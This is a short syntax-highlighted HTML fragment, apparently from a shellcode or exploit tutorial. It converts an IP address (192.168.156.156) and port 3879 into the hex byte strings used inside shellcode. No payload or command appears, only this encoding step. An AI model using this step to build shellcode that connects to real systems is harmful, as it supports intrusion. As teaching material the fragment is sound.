 <span class="no">IP</span><span class="p">:</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">156</span><span class="o">.</span><span class="mi">156</span> <span class="n">is</span> <span class="p">\</span><span class="n">xc0</span><span class="p">\</span><span class="n">xa8</span><span class="p">\</span><span class="n">x9c</span><span class="p">\</span><span class="n">x9c</span>
 <span class="no">Port</span><span class="p">:</span> <span class="mi">3879</span> <span class="n">is</span> <span class="p">\</span><span class="n">x0f</span><span class="p">\</span><span class="n">x27</span>
